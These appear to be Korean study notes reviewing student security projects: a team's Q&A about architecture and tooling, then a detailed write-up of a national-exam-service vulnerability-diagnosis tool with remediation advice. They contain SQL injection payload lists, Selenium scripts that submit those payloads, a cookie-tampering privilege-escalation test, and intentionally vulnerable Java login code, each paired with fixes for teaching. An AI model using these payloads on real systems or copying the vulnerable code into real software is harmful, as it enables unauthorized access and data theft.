> "네 맞습니다. 일단 **3-Tier는 그때 네트워크가 아니라 웹 Presentation 데이터랑 Application 그 계층을 표현**했단 말이고요.
> 그리고 **앞단에 Load Balancer 한 대 있습니다**."

**강사 추가 질문**:
> "Load Balancer 뒷단에서 결국에는 **서비스를 구현한 거는 웹과 WAS가 같이 존재하고 그 뒤에 백단에서 RDS**가 있으면
> **2-Tier로 구현**을 한 걸로 보이고요."

**답변**:
> "네 맞습니다."

**💡 핵심 인사이트**:
- 7조는 **논리적 3-Tier**(Presentation, Application, Data)를 설명했으나
- **물리적으로는 2-Tier**(Web+WAS / RDS) 구성
- 소규모 프로젝트에서는 WAS와 Web Server를 분리하지 않는 것이 일반적

### 질문 2: 진단 스크립트 위치 및 Bastion 역할

**질문** (강사):
> "그러면 뒤에서 또 보여줬던 **점검 스크립트는 어디에 위치**하는 거죠?"

**답변**:
> "점검 스크립트는 **따로 프로그램으로 있습니다**.
> 그 프로그램이 어디에 올라가 있어요?"
> "**현재 점검 스크립트는 로컬에서 수행 돌리고 있습니다**.
> **Docker Compose로 띄울 수도 있고 AWS에 올릴 수는 있는데**..."

**강사 추가 질문**:
> "그러면 지금 **진단 스크립트 자체는 내 PC에서 진행을 한 거고**
> **내 PC에서 저쪽 서버로**, 지금 **구현해놓은 AWS 서버로 접근을 해서 진단을 수행한 건**가요?"

**답변**:
> "네 맞습니다."

**강사**:
> "**Bastion Host가 거기 표현이 되어 있는데 Bastion Host의 역할이 정확히 어떻게 되는 거죠?**
> **웹 서버에 접근 경유하기 위한 역할로 사용**된 건가요?"

**답변**:
> "네 맞습니다. **웹 서버가 Private 서브넷에 위치되어 있고 할당된 Public IP가 없어**
> **로드 밸런서로 포워딩만 받고 있기 때문에**
> **웹 서버에 접근하기 위해서 Bastion 서버를 Public 서브넷에 위치시켜 가지고**
> **원격 SSH 접근을 가능하게** 했습니다."

**💡 핵심 인사이트**:
- 진단 스크립트는 **로컬 PC에서 실행**
- **Bastion Host를 경유하여** Private Subnet의 웹 서버에 SSH 접속
- 실무에서도 일반적으로 사용하는 **Jump Box 패턴**

### 질문 3: Stryker AI 연동

**질문** (강사):
> "갑자기 또 중간에 **Stryker를 통해서 구현을 한다**고 얘기가 돼요.
> 처음에 **자동진단 쭉 구현하다가** 그러면 **Stryker의 역할과 기능 그리고**
> **Stryker에서 우리가 구현한 자동진단 도구가 어떻게 연동되는지 관계를 먼저 설명**을 해주고 설명을 하는 게 맞지 않았나."

**답변**:
> "오늘 좀 자세하게 설명드리면 **원격 진단, Remote 진단 부분은 순수히 모두 저희 스크립트로만 구현**을 했고요.
> 이렇게 **하나하나 67개 플러그인을 싹 다 구현**을 해가지고 구현을 했는데
> **시간 관계상 동적 진단과 정적 진단이 실제 범용적으로 만들기에 부족**하다고 느껴서
> **전부 다 할 수 있는 도구를 그냥 빠르게 넣는 과정에서 Stryker를 넣게** 되어서
> 간단하게 좀 따로 넣는 느낌이 났던 것 같습니다."

**💡 핵심 인사이트**:
- **67개 KISA 플러그인**은 순수 자체 구현
- **SAST/DAST는 시간 부족**으로 Stryker AI 활용
- 시간 제약 속에서 **현실적인 선택**

### 강사 총평

**프로젝트에 대한 회고**:
> "일단 처음에 이제 **웹 구축과 진단 도구를 5일 안에 해야 된다**는 소리를 듣고 **정말 정말 막막**했는데요.
> 저희 **팀원 분들이 진짜 각자 역할에 최선**을 다해주셔서
> **4명이 업무를 분담해서 진행**을 하니까 진짜 **한 분도 빠지지 않고** 이래서
> **진짜 팀 프로젝트의 협업의 중요성**을 좀 알게 됐던 거 같구요."

---

## 🎓 2.2.12 핵심 학습 포인트

### 1. 플러그인 기반 확장 가능한 아키텍처

**발전 가능성**:
> "저희 진단 자동화도구는 **플러그인 기반으로 빠른 확장이 가능**하며,
> **플러그인 추가만으로 KISA 가이드 커버, 외부도구 연동** 등이 가능함으로
> **OWASP ZAP 등의 도구를 추가적으로 연동하여 더욱 디테일한 진단**을 수행할 수 있게 발전 가능성이 있다고 생각합니다."

**표준화된 스키마**:
> "또한 **Findings, Report 포맷을 표준화된 스키마로 제공**함으로,
> **이후에 다른 진단 도구나 파이프라인과의 연계에 용이**하다고 생각합니다."

**올인원 솔루션 가능성**:
> "이러한 특성을 살려 후에 **URL 기반 블랙박스 진단**, **GitHub 기반 화이트박스 진단**, **원격 서버 진단을 모두 아우르는**
> **올인원 오픈소스 프로젝트나 올인원 솔루션 아이템**으로 발전할 수 있을 것이라고 생각합니다."

### 2. 향후 개선 계획

**KISA 커버리지 확대**:
> "향후에는 **KISA 커버리지를 유닉스 외의 Windows나 다른 부분으로 확대**를 하고..."

**Stryker 안정화 및 외부 도구 추가**:
> "**Stryker를 안정화한 후에 외부 도구 추가** 등을 진행하여
> **그레이박스 진단 커버리지를 확대**할 예정입니다."

**리포트 형식 다양화**:
> "또 리포트는 **현재 JSON 형식으로만 제공**이 되어 **대시보드에서만 사용자 친화적으로 볼 수 있지만**,
> 이후에 **마크다운 파일이나 PDF 파일로 보고서 포맷을 제공**할 수 있도록 할 예정입니다."

### 3. 최종 프로젝트 활용 가능성

| 항목 | 내용 |
|:---|:---|
| **진단 커버리지** | KISA 67개 + OWASP Top 10 + Stryker AI |
| **확장성** | 플러그인 추가만으로 확장 가능 |
| **표준화** | Findings, Report 스키마 표준화 |
| **대시보드** | Streamlit 기반 사용자 친화적 UI |
| **CI/CD 통합** | GitHub Actions, GitLab CI 연동 가능 |
| **오픈소스 가능성** | 코드 공개 및 커뮤니티 확장 가능 |

---

**7조 프로젝트 상세 분석 완료**

**Section 2 (10조 + 7조) 완료**

다음: Section 3 (6조 + 3조 프로젝트)
# Section 3: 6조 + 3조 프로젝트 상세 분석

## Part 1: 6조 "합격" - 국가 자격 시험 통합 서비스 취약점 진단

---

## 3.1 6조 프로젝트 개요

### 3.1.1 팀 구성 및 프로젝트 주제

**팀명**: 합격
**프로젝트명**: 국가 자격 시험 통합 서비스 보안 취약점 진단 및 자동화 도구 개발

6조는 국가 자격 시험 서비스라는 민감한 개인정보를 다루는 플랫폼을 구축하고, 이에 대한 보안 취약점 진단 자동화 도구를 개발하는 프로젝트를 수행했습니다.

**핵심 배경**:
- 국가 자격 시험 서비스는 수험생의 개인정보, 시험 결과, 응시 이력 등 민감 정보를 대량으로 보유
- 데이터 유출 시 사회적 파장이 크고, 시험 공정성 훼손 우려
- 고수준의 보안이 절대적으로 요구되나, 수동 점검만으로는 변화하는 위협 환경 대응에 한계
- **상시적인 보안 체계 유지**를 위한 자동화 도구의 필요성 대두

### 3.1.2 시스템 아키텍처

#### AWS 인프라 구성 (3-Tier Architecture)

6조는 실제 운영 환경을 고려하여 AWS 기반 3-Tier 아키텍처를 구축했습니다:

```
[사용자]
   ↓
[인터넷 게이트웨이]
   ↓
┌─────────────────────────────────┐
│  Web Server (웹 서버)           │
│  - 정적 컨텐츠 제공             │
│  - 리버스 프록시 역할           │
│  - EC2 Instance #1              │
└─────────────────────────────────┘
   ↓
┌─────────────────────────────────┐
│  WAS Server (애플리케이션 서버) │
│  - 비즈니스 로직 처리           │
│  - API 서버                      │
│  - EC2 Instance #2              │
└─────────────────────────────────┘
   ↓
┌─────────────────────────────────┐
│  DB Server (데이터베이스 서버)  │
│  - 사용자 정보 저장             │
│  - 시험 결과 관리               │
│  - EC2 Instance #3              │
└─────────────────────────────────┘
```

**AWS 리소스 구성**:
```bash
# EC2 인스턴스 총 3개
ec2_instance_1: Web Server    # Nginx 또는 Apache
ec2_instance_2: WAS Server    # Java 기반 RESTful API
ec2_instance_3: DB Server     # MySQL/MariaDB

# 보안 그룹 설정
security_group_web:
  - Inbound: 80 (HTTP), 443 (HTTPS)
  - Outbound: WAS Server로만 통신

security_group_was:
  - Inbound: Web Server에서만 접근 허용 (예: 8080)
  - Outbound: DB Server로만 통신

security_group_db:
  - Inbound: WAS Server에서만 접근 허용 (예: 3306)
  - Outbound: 제한적 외부 통신
```

#### 보안 그룹 설정 전략

강사의 질문에서 6조는 다음과 같이 답변했습니다:

> "저희 인스턴스 총 3개 열었고, 저희 수업 들었을 때처럼 웹 서버, 와스 서버, DB 서버 이렇게 총 3개 열어서
> 3개 안에 있는 보안그룹을 다르게 설정해서 서버에 올렸습니다."

**보안 그룹 분리의 중요성**:
1. **최소 권한 원칙(Principle of Least Privilege)**: 각 계층이 필요한 최소한의 통신만 허용
2. **심층 방어(Defense in Depth)**: 한 계층이 뚫려도 다음 계층에서 차단 가능
3. **공격 표면 최소화**: DB 서버는 외부에서 직접 접근 불가능하도록 격리

### 3.1.3 기술 스택

#### 프론트엔드
- **Next.js**: React 기반의 서버 사이드 렌더링(SSR) 프레임워크
  - 빠른 페이지 로딩
  - SEO 최적화
  - 코드 스플리팅 자동 지원

#### 백엔드
- **Java RESTful API**: Spring Boot 또는 순수 Java 기반 REST API
  - Stateless한 API 설계
  - JSON 기반 데이터 교환
  - 표준 HTTP 메서드 사용 (GET, POST, PUT, DELETE)

**RESTful API 설계 예시**:
```java
// 사용자 인증 엔드포인트
POST /api/auth/login
Content-Type: application/json
{
  "username": "testuser",
  "password": "password123"
}

// 시험 정보 조회
GET /api/exams
Authorization: Bearer {JWT_TOKEN}

// 시험 응시
POST /api/exams/{exam_id}/apply
Authorization: Bearer {JWT_TOKEN}
{
  "exam_date": "2026-03-15",
  "exam_center": "서울"
}

// 시험 결과 조회
GET /api/exams/{exam_id}/results
Authorization: Bearer {JWT_TOKEN}
```

#### 데이터베이스
- **MySQL/MariaDB**: 관계형 데이터베이스
  - 트랜잭션 지원 (ACID 속성)
  - 복잡한 조인 쿼리 가능
  - 백업 및 복구 용이

**데이터베이스 스키마 예상 구조**:
```sql
-- 사용자 테이블
CREATE TABLE users (
    user_id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    email VARCHAR(100) NOT NULL,
    phone VARCHAR(20),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_username (username)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- 시험 정보 테이블
CREATE TABLE exams (
    exam_id INT PRIMARY KEY AUTO_INCREMENT,
    exam_name VARCHAR(100) NOT NULL,
    exam_date DATE NOT NULL,
    exam_category VARCHAR(50),
    max_participants INT,
    INDEX idx_exam_date (exam_date)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- 시험 응시 테이블
CREATE TABLE exam_applications (
    application_id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT NOT NULL,
    exam_id INT NOT NULL,
    application_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status ENUM('pending', 'confirmed', 'cancelled') DEFAULT 'pending',
    FOREIGN KEY (user_id) REFERENCES users(user_id),
    FOREIGN KEY (exam_id) REFERENCES exams(exam_id),
    INDEX idx_user_exam (user_id, exam_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- 시험 결과 테이블
CREATE TABLE exam_results (
    result_id INT PRIMARY KEY AUTO_INCREMENT,
    application_id INT NOT NULL,
    score INT,
    pass_fail ENUM('pass', 'fail'),
    result_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (application_id) REFERENCES exam_applications(application_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

---

## 3.2 취약점 진단 자동화 도구 개발

### 3.2.1 진단 도구 개발 배경 및 필요성

6조 발표 중 핵심 내용:

> "국가 자격 시험 서비스의 특성상 민감한 개인 정보를 다루기 때문에 고수준의 보안이 절대적으로 요구되나,
> 수동 점검만으로는 변화하는 위협 환경에 대응하거나 상시적인 보안 체계를 유지하는 데 한계가 있어
> **취약점 진단 자동화 도구가 필요함**을 깨달았습니다."

#### 수동 점검의 한계

1. **시간 소모**: 전체 시스템 점검에 수 시간~수 일 소요
2. **인적 오류**: 반복 작업에서 실수 발생 가능
3. **일관성 부족**: 점검자마다 결과가 다를 수 있음
4. **즉각 대응 불가**: 새로운 취약점 발견 시 빠른 재점검 어려움
5. **비용 문제**: 전문 인력 확보 및 유지에 높은 비용

#### 자동화 도구의 장점

1. **신속성**: 수 분 내에 전체 시스템 스캔 가능
2. **일관성**: 동일한 기준으로 항상 동일한 결과
3. **반복 가능**: 원하는 시간에 무제한 재실행
4. **비용 효율**: 초기 개발 비용 외 추가 비용 최소
5. **상시 모니터링**: 주기적 자동 실행으로 지속적 보안 관제 가능

### 3.2.2 Selenium 기반 동적 진단 도구

6조는 웹 애플리케이션 취약점 진단을 위해 **Selenium**을 활용한 동적 진단 도구를 개발했습니다.

#### Selenium이란?

**Selenium**은 웹 브라우저 자동화 도구로, 다음과 같은 특징을 가집니다:

- **실제 브라우저 제어**: Chrome, Firefox 등 실제 브라우저를 조작
- **JavaScript 실행**: AJAX, SPA(Single Page Application) 테스트 가능
- **사용자 행동 모방**: 클릭, 입력, 스크롤 등 사용자 동작 재현
- **크로스 브라우저 테스트**: 여러 브라우저에서 동일한 테스트 수행

#### Selenium WebDriver 기본 사용법

```python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Chrome 드라이버 초기화
driver = webdriver.Chrome()

try:
    # 타겟 URL 접속
    driver.get("http://example-exam-service.com/login")

    # 로그인 폼 요소 찾기
    username_field = driver.find_element(By.ID, "username")
    password_field = driver.find_element(By.ID, "password")

    # 테스트 계정으로 로그인 시도
    username_field.send_keys("test_user")
    password_field.send_keys("test_password")
    password_field.send_keys(Keys.RETURN)

    # 로그인 완료 대기 (최대 10초)
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "dashboard"))
    )

    print("로그인 성공!")

    # 페이지 소스 가져오기
    page_source = driver.page_source

    # SQL Injection 취약점 테스트
    search_box = driver.find_element(By.ID, "exam_search")
    search_box.send_keys("' OR '1'='1")
    search_box.send_keys(Keys.RETURN)

    time.sleep(2)

    # 결과 확인
    result_page = driver.page_source
    if "error" not in result_page.lower():
        print("[취약] SQL Injection 가능성 있음")
    else:
        print("[안전] SQL Injection 방어됨")

finally:
    driver.quit()
```

#### 6조의 Selenium 활용 전략

발표 내용에서 강사의 지적:

> "셀레니엄을 사용하거나 이렇게 해서 코딩을 하게 되면 셀레니엄은 그 브라우저를 켜고 그 브라우저 안에서 컨트롤을 자동화 시키는 거라
> 실제로 여기에서 만약에 **사이트가 바뀐다거나 이제 좀 구조가 틀어지면 처음부터 또 다 다시 만들어야 될 거거든요.**
> **범용성이나 확장성을 가지기가 되게 힘든 구조**예요."

**Selenium의 한계**:
1. **높은 의존성**: HTML 구조 변경 시 스크립트 전면 수정 필요
2. **유지보수 비용**: 사이트 업데이트마다 스크립트 재작성
3. **속도 문제**: 실제 브라우저 구동으로 느린 실행 속도
4. **리소스 소모**: 메모리 및 CPU 사용량 높음

**개선 방안**:
```python
# 하드코딩된 셀렉터 (나쁜 예)
username_field = driver.find_element(By.ID, "username_field_v2_20240115")

# 유연한 셀렉터 (좋은 예)
username_field = driver.find_element(By.CSS_SELECTOR, "input[name*='username']")
# 또는 XPath 사용
username_field = driver.find_element(By.XPATH, "//input[contains(@placeholder, '아이디')]")
```

더 나은 대안으로는 **API 기반 테스트** 또는 **헤드리스 브라우저**를 고려할 수 있습니다:

```python
# Requests 라이브러리를 이용한 API 직접 테스트 (더 빠름)
import requests

# 로그인 API 호출
login_response = requests.post(
    "http://example-exam-service.com/api/auth/login",
    json={"username": "test_user", "password": "test_password"}
)

# JWT 토큰 추출
token = login_response.json().get("access_token")

# SQL Injection 테스트
search_response = requests.get(
    "http://example-exam-service.com/api/exams/search",
    params={"query": "' OR '1'='1"},
    headers={"Authorization": f"Bearer {token}"}
)

# 응답 분석
if search_response.status_code == 500:
    print("[취약] SQL Injection 가능")
elif "error" in search_response.json():
    print("[안전] 입력값 검증됨")
```

### 3.2.3 주요 취약점 진단 항목

#### SQL Injection 진단

6조는 SQL Injection을 가장 중요한 진단 항목으로 선정했습니다.

**SQL Injection 테스트 페이로드 예시**:
```python
sql_injection_payloads = [
    # 인증 우회
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR '1'='1'#",

    # UNION 기반 공격
    "' UNION SELECT NULL, username, password FROM users--",

    # Error-based Injection
    "' AND 1=CONVERT(int, (SELECT @@version))--",

    # Time-based Blind Injection
    "' AND IF(1=1, SLEEP(5), 0)--",

    # Boolean-based Blind Injection
    "' AND '1'='1",
    "' AND '1'='2"
]

def test_sql_injection(driver, target_url, input_element_id):
    """
    SQL Injection 취약점 자동 테스트
    """
    results = []

    for payload in sql_injection_payloads:
        driver.get(target_url)
        time.sleep(1)

        try:
            # 입력 필드에 페이로드 삽입
            input_field = driver.find_element(By.ID, input_element_id)
            input_field.clear()
            input_field.send_keys(payload)
            input_field.send_keys(Keys.RETURN)

            time.sleep(2)

            # 응답 분석
            page_source = driver.page_source.lower()

            # 취약점 징후 탐지
            vulnerability_indicators = [
                "sql syntax",
                "mysql error",
                "you have an error in your sql syntax",
                "warning: mysql",
                "unclosed quotation mark",
                "quoted string not properly terminated"
            ]

            is_vulnerable = any(indicator in page_source for indicator in vulnerability_indicators)

            results.append({
                "payload": payload,
                "vulnerable": is_vulnerable,
                "evidence": page_source[:500] if is_vulnerable else None
            })

        except Exception as e:
            results.append({
                "payload": payload,
                "error": str(e)
            })

    return results
```

#### CSRF (Cross-Site Request Forgery) 취약점 진단

**CSRF 취약점 탐지 로직**:
```python
def test_csrf_vulnerability(driver, target_url):
    """
    CSRF 토큰 존재 여부 확인
    """
    driver.get(target_url)
    time.sleep(2)

    # 폼 요소 찾기
    forms = driver.find_elements(By.TAG_NAME, "form")

    csrf_token_found = False

    for form in forms:
        # CSRF 토큰 필드 확인
        csrf_fields = form.find_elements(By.CSS_SELECTOR, "input[name*='csrf'], input[name*='token']")

        if csrf_fields:
            csrf_token_found = True
            print(f"[안전] CSRF 토큰 발견: {csrf_fields[0].get_attribute('name')}")
        else:
            print(f"[취약] CSRF 토큰 없음 - Action: {form.get_attribute('action')}")

    return csrf_token_found
```

#### 쿠키 변조를 통한 권한 탈취

발표 내용:

> "쿠키 변조를 통한 권한 탈취 등 실제 서비스 운영에 치명적인 공격이 올 수 있음을 확인하였습니다."

**쿠키 변조 테스트**:
```python
def test_cookie_manipulation(driver, target_url):
    """
    쿠키 변조를 통한 권한 상승 테스트
    """
    # 일반 사용자로 로그인
    driver.get(f"{target_url}/login")
    driver.find_element(By.ID, "username").send_keys("normal_user")
    driver.find_element(By.ID, "password").send_keys("password123")
    driver.find_element(By.ID, "login_button").click()

    time.sleep(2)

    # 현재 쿠키 확인
    cookies = driver.get_cookies()
    print("현재 쿠키:", cookies)

    # 쿠키 변조 시도 (role을 admin으로 변경)
    for cookie in cookies:
        if 'role' in cookie['name'].lower():
            driver.delete_cookie(cookie['name'])
            driver.add_cookie({
                'name': cookie['name'],
                'value': 'admin',  # 권한 상승 시도
                'domain': cookie['domain'],
                'path': cookie['path']
            })
            print(f"[테스트] 쿠키 변조: {cookie['name']} = admin")

    # 관리자 페이지 접근 시도
    driver.get(f"{target_url}/admin")
    time.sleep(2)

    # 접근 성공 여부 확인
    if "admin" in driver.current_url.lower() or "관리자" in driver.page_source:
        print("[취약] 쿠키 변조를 통한 권한 탈취 가능")
        return True
    else:
        print("[안전] 쿠키 변조 방어됨")
        return False
```

---

## 3.3 주요 취약점 발견 사례

### 3.3.1 SQL Injection을 통한 인증 우회

**취약한 코드 예시 (Java)**:
```java
// 취약한 로그인 처리 코드
@PostMapping("/api/auth/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    String username = request.getUsername();
    String password = request.getPassword();

    // 취약점: 사용자 입력을 직접 쿼리에 삽입
    String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

    // JDBC를 이용한 쿼리 실행
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);

    if (rs.next()) {
        // 로그인 성공
        String token = generateJWT(rs.getString("user_id"));
        return ResponseEntity.ok(new LoginResponse(token));
    } else {
        return ResponseEntity.status(401).body("Invalid credentials");
    }
}
```

**공격 시나리오**:
```
# 공격자가 입력한 username
admin' OR '1'='1'--

# 실제로 실행되는 SQL 쿼리
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = ''

# 결과: WHERE 조건이 항상 true가 되어 첫 번째 사용자(보통 관리자)로 로그인됨
```

**안전한 코드 (Prepared Statement 사용)**:
```java
// 안전한 로그인 처리 코드
@PostMapping("/api/auth/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    String username = request.getUsername();
    String password = request.getPassword();

    // Prepared Statement 사용
    String query = "SELECT * FROM users WHERE username = ? AND password = ?";

    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, username);  // 첫 번째 ? 에 username 바인딩
    pstmt.setString(2, password);  // 두 번째 ? 에 password 바인딩

    ResultSet rs = pstmt.executeQuery();

    if (rs.next()) {
        String token = generateJWT(rs.getString("user_id"));
        return ResponseEntity.ok(new LoginResponse(token));
    } else {
        return ResponseEntity.status(401).body("Invalid credentials");
    }
}
```

**Prepared Statement의 동작 원리**:
```
# 입력값: admin' OR '1'='1'--

# Prepared Statement에서는 이 값이 문자열 리터럴로 처리됨
SELECT * FROM users WHERE username = 'admin\' OR \'1\'=\'1\'--' AND password = ''

# 결과: SQL 구문이 아닌 단순 문자열로 인식되어 인젝션 불가
```

### 3.3.2 쿠키 변조를 통한 권한 탈취

**취약한 쿠키 설정**:
```java
// 취약한 세션 쿠키 생성
Cookie sessionCookie = new Cookie("session_id", sessionId);
sessionCookie.setMaxAge(3600);  // 1시간
response.addCookie(sessionCookie);

Cookie roleCookie = new Cookie("user_role", "user");  // 역할 정보를 쿠키에 저장 (취약!)
roleCookie.setMaxAge(3600);
response.addCookie(roleCookie);
```

**공격 시나리오**:
```javascript
// 브라우저 개발자 도구 콘솔에서 쿠키 변조
document.cookie = "user_role=admin; path=/";

// 이후 관리자 페이지 접근 시 변조된 쿠키로 인증됨
```

**안전한 구현**:
```java
// 서버 측 세션에 역할 저장
HttpSession session = request.getSession();
session.setAttribute("user_role", "user");  // 서버 메모리에 저장

// 세션 ID만 쿠키로 전송 (HttpOnly, Secure 플래그 설정)
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
sessionCookie.setHttpOnly(true);   // JavaScript 접근 불가
sessionCookie.setSecure(true);     // HTTPS에서만 전송
sessionCookie.setMaxAge(3600);
response.addCookie(sessionCookie);
```

### 3.3.3 HTTP를 통한 계정 정보 노출

발표 내용:

> "HTTP 프로토콜 사용으로 인해 API 통신 시 계정 정보가 암호화되고 있지 않으며,
> 소스코드 내에 DB 접속 정보가 노출되어 있는 문제가 발생했습니다."

#### 문제점 1: HTTP 평문 통신

**Wireshark로 패킷 캡처 시나리오**:
```
# HTTP 요청 (평문)
POST /api/auth/login HTTP/1.1
Host: exam-service.com
Content-Type: application/json

{
  "username": "admin",
  "password": "SuperSecret123!"
}

# 결과: 네트워크 스니핑으로 계정 정보 그대로 노출
```

**해결책: HTTPS 적용**:
```bash
# Let's Encrypt를 이용한 무료 SSL 인증서 발급
sudo apt install certbot python3-certbot-nginx

# Nginx에 SSL 인증서 적용
sudo certbot --nginx -d exam-service.com

# 자동 갱신 설정
sudo certbot renew --dry-run
```

**Nginx HTTPS 설정**:
```nginx
server {
    listen 443 ssl http2;
    server_name exam-service.com;

    ssl_certificate /etc/letsencrypt/live/exam-service.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/exam-service.com/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;

    # HSTS (HTTP Strict Transport Security)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

# HTTP를 HTTPS로 리다이렉트
server {
    listen 80;
    server_name exam-service.com;
    return 301 https://$server_name$request_uri;
}
```

#### 문제점 2: 소스코드 내 DB 접속 정보 하드코딩

**취약한 코드**:
```java
// application.properties 또는 코드에 하드코딩 (취약!)
public class DatabaseConfig {
    private static final String DB_URL = "jdbc:mysql://10.0.1.100:3306/exam_db";
    private static final String DB_USER = "admin";
    private static final String DB_PASSWORD = "P@ssw0rd123!";  // 평문 비밀번호

    public Connection getConnection() {
        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
    }
}
```

**안전한 방법 1: 환경 변수 사용**:
```java
// 환경 변수에서 읽기
public class DatabaseConfig {
    private static final String DB_URL = System.getenv("DB_URL");
    private static final String DB_USER = System.getenv("DB_USER");
    private static final String DB_PASSWORD = System.getenv("DB_PASSWORD");

    public Connection getConnection() {
        return DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
    }
}
```

**환경 변수 설정 (Linux)**:
```bash
# /etc/environment 또는 ~/.bashrc
export DB_URL="jdbc:mysql://10.0.1.100:3306/exam_db"
export DB_USER="app_user"
export DB_PASSWORD="Complex_P@ssw0rd_2026"

# Docker 환경에서
docker run -e DB_URL="jdbc:mysql://db:3306/exam_db" \
           -e DB_USER="app_user" \
           -e DB_PASSWORD="secret" \
           exam-service
```

**안전한 방법 2: AWS Secrets Manager 사용**:
```java
import com.amazonaws.services.secretsmanager.*;
import com.amazonaws.services.secretsmanager.model.*;
import com.google.gson.Gson;

public class DatabaseConfig {
    public Connection getConnection() {
        // AWS Secrets Manager에서 비밀번호 가져오기
        String secretName = "prod/exam-service/db";
        AWSSecretsManager client = AWSSecretsManagerClientBuilder.standard()
            .withRegion("ap-northeast-2")
            .build();

        GetSecretValueRequest getSecretValueRequest = new GetSecretValueRequest()
            .withSecretId(secretName);
        GetSecretValueResult getSecretValueResult = client.getSecretValue(getSecretValueRequest);

        String secret = getSecretValueResult.getSecretString();
        Gson gson = new Gson();
        DBCredentials creds = gson.fromJson(secret, DBCredentials.class);

        return DriverManager.getConnection(creds.getUrl(), creds.getUsername(), creds.getPassword());
    }
}

class DBCredentials {
    private String url;
    private String username;
    private String password;
    // getters and setters
}
```

---

## 3.4 진단 결과 및 대응 방안

### 3.4.1 발견된 취약점 우선순위

6조는 진단 결과를 바탕으로 다음과 같은 우선순위를 설정했습니다:

| 우선순위 | 취약점 유형 | 위험도 | 발견 건수 | 대응 시급성 |
|---------|-----------|--------|----------|-----------|
| 1순위 | SQL Injection | 치명적 (Critical) | 5건 | 즉시 조치 |
| 2순위 | 인증 우회 | 높음 (High) | 3건 | 24시간 내 |
| 3순위 | 쿠키 변조 권한 탈취 | 높음 (High) | 2건 | 24시간 내 |
| 4순위 | HTTP 평문 통신 | 중간 (Medium) | 전체 | 1주일 내 |
| 5순위 | 소스코드 내 민감정보 노출 | 중간 (Medium) | 7건 | 1주일 내 |

### 3.4.2 단계별 대응 로드맵

**1단계: 즉시 조치 (24시간 내)**
```java
// 모든 SQL 쿼리를 Prepared Statement로 전환
// Before
String query = "SELECT * FROM users WHERE id = " + userId;

// After
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setInt(1, userId);
```

**2단계: 단기 조치 (1주일 내)**
```java
// 서버 측 세션 관리 강화
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .maximumSessions(1)  // 동시 로그인 1개로 제한
                .maxSessionsPreventsLogin(true)  // 새 로그인 차단
            .and()
            .sessionFixation().newSession()  // 로그인 시 새 세션 생성
            .and()
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}
```

**3단계: 중기 조치 (1개월 내)**
```bash
# SSL/TLS 인증서 도입
sudo certbot --nginx -d exam-service.com -d www.exam-service.com

# 환경 변수로 민감 정보 분리
# .env 파일 생성 (절대 git에 커밋하지 말 것!)
DB_HOST=10.0.1.100
DB_PORT=3306
DB_NAME=exam_db
DB_USER=app_user
DB_PASSWORD=strong_random_password_here

# Spring Boot에서 환경 변수 사용
spring.datasource.url=jdbc:mysql://${DB_HOST}:${DB_PORT}/${DB_NAME}
spring.datasource.username=${DB_USER}
spring.datasource.password=${DB_PASSWORD}
```

### 3.4.3 예방 대책 및 보안 가이드라인 준수

발표 결론 부분:

> "앞으로도 보안 가이드라인을 상시 준수하여 신뢰받는 자격 시험 서비스를 운영하겠습니다."

#### OWASP Top 10 준수 체크리스트

```markdown
## OWASP Top 10 2021 대응 체크리스트

### A01:2021 - Broken Access Control
- [ ] 모든 API 엔드포인트에 권한 검사 구현
- [ ] URL 파라미터 조작으로 타인 정보 접근 불가 확인
- [ ] 관리자 페이지 접근 제어 강화

### A02:2021 - Cryptographic Failures
- [ ] HTTPS 적용 (모든 통신 암호화)
- [ ] 비밀번호 해시 저장 (bcrypt, Argon2 사용)
- [ ] 민감 데이터 암호화 저장

### A03:2021 - Injection
- [ ] 모든 SQL 쿼리에 Prepared Statement 적용
- [ ] 사용자 입력 검증 및 이스케이프 처리
- [ ] ORM 사용으로 SQL Injection 방지

### A04:2021 - Insecure Design
- [ ] 보안 요구사항 정의서 작성
- [ ] 위협 모델링 수행
- [ ] 안전한 설계 원칙 적용

### A05:2021 - Security Misconfiguration
- [ ] 기본 계정/비밀번호 변경
- [ ] 불필요한 서비스 비활성화
- [ ] 에러 메시지에 민감 정보 노출 방지

